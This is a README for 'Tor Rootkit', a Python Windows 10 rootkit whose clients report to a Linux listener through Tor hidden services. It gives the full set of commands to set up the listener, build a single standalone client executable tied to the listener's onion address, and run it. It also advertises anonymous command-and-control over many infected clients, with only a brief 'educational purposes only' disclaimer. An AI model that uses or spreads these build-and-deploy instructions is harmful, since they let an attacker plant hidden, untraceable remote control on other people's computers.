# Tor Rootkit
[![License: MIT](https://img.shields.io/badge/License-MIT-brightgreen.svg)](https://opensource.org/licenses/MIT)

A Python 3 standalone Windows 10 Rootkit. The networking works over tor hidden services.


## Installation
- Clone with git:
```bash
git clone https://github.com/emcruise/TorRootkit.git
```

- Change directory to the repository:
```bash
cd ./TorRootkit
```

### Listener
The listener is designed to run on linux.

#### Prerequisites
- [Tor](https://www.torproject.org/)
- [Python3](https://www.python.org/)
- [Pip3](https://pypi.org/project/pip/)

1. Install all pip3 dependencies:
```bash
pip3 install -r listener/requirements.txt
```

2. Run the listener:
```bash
./listener/listener.py <hiddenservice-port> <local-port>
```

### Client
The client is designed to run on Windows 10.

#### Prerequisites
- [Python3](https://www.python.org/)
- [Pip3](https://pypi.org/project/pip/)

1. Install all pip3 dependencies:
```bash
pip3 install -r client\requirements.txt
```
2. Build executable from build.py:
- downloads [Tor Expert Bundle](https://www.torproject.org/download/tor/)
- bundles python3 interpreter and tor expert bundle into 1 standalone .exe file
```bash
python client\build.py <listener-onion-address> <listener-onion-port>
```

3. Execute the bundled client:
```bash
.\client\dist\client.exe
```

## Features
- Standalone executable, including python interpreter and tor expert bundle (~13MB)
- the whole communication works over tor hidden services which guarantees some degree of anonymity
- Listener can handle multiple clients

## Disclaimer
Use for educational purposes only.
